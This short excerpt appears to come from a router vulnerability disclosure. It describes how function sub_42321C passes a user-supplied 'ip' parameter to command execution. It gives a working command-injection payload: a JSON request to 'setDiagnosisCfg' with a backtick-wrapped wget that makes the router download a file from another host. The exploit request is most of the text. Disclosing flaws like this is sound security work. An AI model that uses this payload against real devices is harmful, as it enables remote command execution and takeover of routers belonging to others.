...
In sub_42321C function, it reads in a user-provided parameter `ip` .
...
We set `ip` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setDiagnosisCfg","ip":"`wget 192.168.6.1:7777/testpoc`"
}
```
